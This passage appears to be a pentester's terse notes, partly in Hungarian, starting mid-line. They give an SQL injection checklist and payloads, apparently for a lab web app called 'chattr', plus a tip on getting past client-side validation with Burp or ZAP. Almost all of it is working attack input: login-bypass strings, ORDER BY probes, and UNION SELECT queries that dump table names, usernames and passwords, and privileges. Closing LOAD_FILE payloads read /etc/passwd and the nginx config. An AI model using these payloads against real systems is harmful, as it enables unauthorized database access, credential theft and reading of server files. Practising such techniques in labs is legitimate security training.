om' or id = '1')--
Ha js-el validál akkor elősször be kell írni a jó formátumot és burp-el vagy zappal kell átírni a 
Check list:
- Login screen:
	- Basic login bypass:
		- admin' or '1'='1#
		- admin'-- -
		- admin')-- -
		- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
	- Order by:
		- ' order by 1-- -
		- ' order by 1--
	- Union select:




 q=adawd') UNION ALL SELECT NULL,NULL,NULL,@@datadir-- -&u=3

 q=adawd') UNION ALL SELECT NULL,NULL,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -&u=
 
 q=adawd') UNION ALL SELECT NULL,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -&u=3


q=adawd') UNION ALL SELECT NULL,NULL, username, password from chattr.Users-- -&u=3
q=adawd') UNION ALL SELECT NULL,NULL,grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -&u=3


q=adawd') UNION ALL SELECT NULL,NULL,NULL,user from chattr.user-- -&u=

chattr_dbUser@localhost
LOAD_FILE("/etc/passwd")
 q=adawd') UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -&u=3